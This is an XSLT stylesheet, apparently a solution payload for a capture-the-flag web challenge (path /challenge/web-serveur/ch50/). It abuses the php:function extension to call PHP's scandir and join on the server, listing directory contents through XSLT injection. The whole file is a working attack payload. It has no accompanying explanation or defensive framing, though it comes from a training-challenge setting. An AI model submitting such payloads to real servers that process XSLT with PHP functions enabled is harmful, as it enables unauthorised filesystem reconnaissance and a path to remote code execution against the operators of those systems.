<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl"
  exclude-result-prefixes="php">

  <xsl:output method="html" encoding="UTF-8" indent="yes"/>

  <xsl:template match="/">
    <html>
      <body>
        <h2>Files in directory</h2>
        <pre>
          <xsl:variable name="listing" select="php:function('scandir', '/challenge/web-serveur/ch50/')" />
          <xsl:value-of select="php:function('join', $listing, ' ')" />
        </pre>
      </body>
    </html>
  </xsl:template>

</xsl:stylesheet>
